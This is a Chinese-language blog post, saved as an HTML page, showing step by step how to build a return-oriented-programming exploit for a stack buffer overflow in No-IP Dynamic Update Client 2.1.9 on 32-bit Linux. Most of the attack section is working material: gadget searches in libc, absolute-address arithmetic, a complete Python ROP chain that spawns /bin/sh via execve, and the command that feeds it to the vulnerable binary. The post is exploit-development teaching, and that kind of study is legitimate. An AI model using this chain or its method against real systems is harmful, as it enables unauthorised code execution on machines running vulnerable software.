@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>构造 NO IP(DUC) ROP exploit | Star</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="缓冲区溢出," />
+  
+
+  <meta name="description" content="No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析，分析了漏洞成因和基本 POC 构造。一般情况，应用程序的栈和堆是不可执行的，本文旨在编写通用的exploit。
+I、实验环境
+操作系统： kali 3.18.0-kali3-686-pae #1 SMP Debian 3.18.6-1~kali2
+调试工具：edb-debugger
+ROP gadget">
+<meta property="og:type" content="article">
+<meta property="og:title" content="构造 NO IP(DUC) ROP exploit">
+<meta property="og:url" content="http://huirong.github.io/2016/03/29/NoIP-StackOverflow-ROP/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析，分析了漏洞成因和基本 POC 构造。一般情况，应用程序的栈和堆是不可执行的，本文旨在编写通用的exploit。
+I、实验环境
+操作系统： kali 3.18.0-kali3-686-pae #1 SMP Debian 3.18.6-1~kali2
+调试工具：edb-debugger
+ROP gadget">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2excag2rij30r206ntc5.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2exjrkobmj30pd0f1do1.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2exwnv2q3j30lw08cmzi.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2exzlzap0j30kb0entcl.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2ey6al4fbj30kd05habx.jpg">
+<meta property="og:updated_time" content="2016-04-16T09:12:01.841Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="构造 NO IP(DUC) ROP exploit">
+<meta name="twitter:description" content="No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析，分析了漏洞成因和基本 POC 构造。一般情况，应用程序的栈和堆是不可执行的，本文旨在编写通用的exploit。
+I、实验环境
+操作系统： kali 3.18.0-kali3-686-pae #1 SMP Debian 3.18.6-1~kali2
+调试工具：edb-debugger
+ROP gadget">
+<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2excag2rij30r206ntc5.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/huirong.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016sfsf1fba3xxxx8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#I、实验环境"><span class="toc-text">I、实验环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#II、exploit-结构"><span class="toc-text">II、exploit 结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-参数分布"><span class="toc-text">① 参数分布</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-exploit-结构"><span class="toc-text">② exploit 结构</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#III、搜索-ROP-gadgets"><span class="toc-text">III、搜索 ROP gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-查看-noip-关联的库"><span class="toc-text">① 查看 noip 关联的库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-调用-ropeme-generate-函数"><span class="toc-text">② 调用 ropeme generate 函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-搜索-xor-eax-eax-ret"><span class="toc-text">③ 搜索 xor eax,eax;ret;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#④-搜索其他-gadgets，并生成-exploit"><span class="toc-text">④ 搜索其他 gadgets，并生成 exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IV、以-ROP-exploit-运行-noip"><span class="toc-text">IV、以 ROP exploit 运行 noip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V、参考文献"><span class="toc-text">V、参考文献</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-NoIP-StackOverflow-ROP" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">构造 NO IP(DUC) ROP exploit</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2016.03.29</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>star</span>
+        </span>
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://huirong.github.io/2016/03/29/NoIP-StackOverflow-ROP/#disqus_thread"></a>
+        </span>
+      
+
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p><a href="http://huirong.github.io/2016/03/28/NoIP-StackOverflow/">No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析</a>，分析了漏洞成因和基本 POC 构造。<br>一般情况，应用程序的栈和堆是不可执行的，本文旨在编写通用的exploit。</p>
+<h1 id="I、实验环境"><a href="#I、实验环境" class="headerlink" title="I、实验环境"></a>I、实验环境</h1><ul>
+<li>操作系统： kali 3.18.0-kali3-686-pae #1 SMP Debian 3.18.6-1~kali2</li>
+<li>调试工具：edb-debugger</li>
+<li>ROP gadget 搜索工具：ropeme</li>
+<li>应用程序：<a href="https://www.exploit-db.com/apps/3b0f5f2ff8637c73ab337be403252a60-noip-duc-linux.tar.gz" target="_blank" rel="external">No-IP</a></li>
+</ul>
+<h1 id="II、exploit-结构"><a href="#II、exploit-结构" class="headerlink" title="II、exploit 结构"></a>II、exploit 结构</h1><p>关于 ROP exploit 详细构造过程，请参考<a href="http://huirong.github.io/2016/03/11/ROP-exploit/">ROP exploit 编写</a>。</p>
+<h2 id="①-参数分布"><a href="#①-参数分布" class="headerlink" title="① 参数分布"></a>① 参数分布</h2><p>Linux 系统调用参数存放于 ebx,edx,esi,edi，因此</p>
+<ul>
+<li>ebx：存放字符串”/bin/sh” 地址</li>
+<li>ecx：存放指向 argp 数组的指针</li>
+<li>edx：存放指向 envp 数组的指针</li>
+<li>eax：系统调用号 0xb</li>
+</ul>
+<h2 id="②-exploit-结构"><a href="#②-exploit-结构" class="headerlink" title="② exploit 结构"></a>② exploit 结构</h2><ol>
+<li>清零 eax</li>
+<li>ecx 设置为 argp 数组指针</li>
+<li>edx 设置为 anvp 数组指针</li>
+<li>将 “/bin/sh” 地址存放于 ebx</li>
+<li>eax 值加 0xb</li>
+<li>执行系统调用,int 0x80</li>
+<li>eax 清零</li>
+<li>eax 加 1</li>
+<li>ebx 清零</li>
+<li><p>执行系统调用，int 0x1</p>
+<p><font color="red">Tips：</font> 7、8、9、10 正常退出shellcode，尽管没有这几个 gadgets，shellcode 依然可以新建shell，但要具有良好的编写习惯。<br>详细请参考 <a href="http://www.vividmachines.com/shellcode/shellcode.html" target="_blank" rel="external">Shellcoding for Linux and Windows Tutorial</a></p>
+</li>
+</ol>
+<h1 id="III、搜索-ROP-gadgets"><a href="#III、搜索-ROP-gadgets" class="headerlink" title="III、搜索 ROP gadgets"></a>III、搜索 ROP gadgets</h1><h2 id="①-查看-noip-关联的库"><a href="#①-查看-noip-关联的库" class="headerlink" title="① 查看 noip 关联的库"></a>① 查看 noip 关联的库</h2><ul>
+<li><p>查看 noip 进程号pid </p>
+ <figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ps</span> -aux | <span class="keyword">grep</span> noip</div></pre></td></tr></table></figure>
+<p> <img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2excag2rij30r206ntc5.jpg" alt=""></p>
+<p> 进程 pid : 6589</p>
+</li>
+<li><p>查看对应 pid 的映射表maps<br> cat /proc/pid/maps</p>
+ <figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">cat</span> /<span class="meta">proc</span>/<span class="number">6589</span>/maps</div></pre></td></tr></table></figure>
+<p> <img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2exjrkobmj30pd0f1do1.jpg" alt=""></p>
+</li>
+</ul>
+<h2 id="②-调用-ropeme-generate-函数"><a href="#②-调用-ropeme-generate-函数" class="headerlink" title="② 调用 ropeme generate 函数"></a>② 调用 ropeme generate 函数</h2><p>系统库函数 /lib/i386-linux-gnu/i686/cmov/libc-2.19.so 包含丰富的 gadgets，足够组成 ROP exploit，因此选择搜索库函数 /lib/i386-linux-gnu/i686/cmov/libc-2.19.so。</p>
+ <font color="red">此库函数的起始地址 ：0xb7e15000需用此地址计算 gadgets 的绝对地址。</font>
+
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">generate /<span class="class"><span class="keyword">lib</span>/<span class="title">i386</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">i686</span>/<span class="title">cmov</span>/<span class="title">libc</span>-2.19.<span class="title">so</span> 4</span></div></pre></td></tr></table></figure>
+<p> <img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2exwnv2q3j30lw08cmzi.jpg" alt=""></p>
+<h2 id="③-搜索-xor-eax-eax-ret"><a href="#③-搜索-xor-eax-eax-ret" class="headerlink" title="③ 搜索 xor eax,eax;ret;"></a>③ 搜索 xor eax,eax;ret;</h2><figure class="highlight erlang"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">search <span class="keyword">xor</span> eax <span class="comment">%</span></div></pre></td></tr></table></figure>
+<p><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2exzlzap0j30kb0entcl.jpg" alt=""></p>
+<p>结果集中的所有 gadgets 地址都是相对地址</p>
+<font color="red">绝对地址 = 相对地址 + 库函数起始地址</font> 
+
+<p>选取 0x2ed2cL: xor eax eax ;;<br>绝对地址 ：0xb7e15000 + 0x2ed2c = 0xb7e43d2c</p>
+<h2 id="④-搜索其他-gadgets，并生成-exploit"><a href="#④-搜索其他-gadgets，并生成-exploit" class="headerlink" title="④ 搜索其他 gadgets，并生成 exploit"></a>④ 搜索其他 gadgets，并生成 exploit</h2><p>以同样的方式搜索其他 gadgets ，并计算绝对地址。</p>
+<p>前文介绍，返回地址的偏移量为：296，因此要先填充 296 个 ‘\x90’。<br>最后 exploit：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment"># execve generated by ROPgadget</span></div><div class="line"></div><div class="line">from struct import <span class="keyword">pack</span></div><div class="line"></div><div class="line"><span class="comment"># Padding goes here</span></div><div class="line">p = <span class="string">''</span></div><div class="line">p += <span class="string">'\x90'</span>*<span class="number">296</span></div><div class="line"></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7f01e30</span>) <span class="comment"># 0xece30L: pop ecx ; pop eax ;;</span></div><div class="line">p += <span class="string">'/bin'</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08052140</span>) <span class="comment"># @ .data</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7e42ece</span>) <span class="comment"># 0x2deceL: mov [eax] ecx ;;</span></div><div class="line"></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7f01e30</span>) <span class="comment"># 0xece30L: pop ecx ; pop eax ;;</span></div><div class="line">p += <span class="string">'//sh'</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08052144</span>) <span class="comment"># @ .data + 4</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7e42ece</span>) <span class="comment"># 0x2deceL: mov [eax] ecx ;;</span></div><div class="line"></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7e43d2c</span>) <span class="comment"># 0x2ed2cL: xor eax eax ;;</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7e16aa2</span>) <span class="comment"># 0x1aa2L: pop edx ;;</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08052148</span>) <span class="comment"># @ .data + 8</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7f19611</span>) <span class="comment"># 0x104611L: mov [edx] eax ; xor eax eax ;;</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7e430cb</span>) <span class="comment"># 0x2e0cbL: pop ecx ; pop edx ;;</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08052148</span>) <span class="comment"># @ .data + 8</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08052148</span>) <span class="comment"># @ .data + 8 </span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7e2e8ae</span>) <span class="comment"># 0x198aeL: pop ebx ;;</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08052140</span>) <span class="comment"># @ .data</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7f56e56</span>) <span class="comment"># 0x141e56L: add eax 0xb ;;</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7fdfce0</span>) <span class="comment"># 0xce0L: int 0x80 ;;</span></div><div class="line"></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7e96547</span>) <span class="comment"># xor edx edx ; mov eax edx ;;</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7eedfc2</span>) <span class="comment"># mov ebx edx ;;</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7fdfd76</span>) <span class="comment"># 0xd76L: add al 0x1 ;;</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0xb7fdfce0</span>) <span class="comment"># 0xce0L: int 0x80 ;;</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> p</div></pre></td></tr></table></figure></p>
+<h1 id="IV、以-ROP-exploit-运行-noip"><a href="#IV、以-ROP-exploit-运行-noip" class="headerlink" title="IV、以 ROP exploit 运行 noip"></a>IV、以 ROP exploit 运行 noip</h1><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./NO-IP/noip<span class="number">-2.1</span><span class="number">.9</span><span class="number">-1</span>/binaries/noip2-i686 -i <span class="string">"`./NO-IP/ropExp.py`"</span></div></pre></td></tr></table></figure>
+<p><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2ey6al4fbj30kd05habx.jpg" alt=""></p>
+<h1 id="V、参考文献"><a href="#V、参考文献" class="headerlink" title="V、参考文献"></a>V、参考文献</h1><p><a href="https://www.exploit-db.com/exploits/25411/" target="_blank" rel="external">No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow</a></p>
+
+    
+  </div>
+</article>
+
+</div>
+
+
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'huirong';
+    
+    var disqus_url = 'http://huirong.github.io/2016/03/29/NoIP-StackOverflow-ROP/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//huirong.disqus.com/count.js" async></script>
+
+
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="http://huirong.github.io/2016/03/29/NoIP-StackOverflow-ROP/index.html" data-title="构造 NO IP(DUC) ROP exploit" data-url="http://huirong.github.io/2016/03/29/NoIP-StackOverflow-ROP/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"star"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
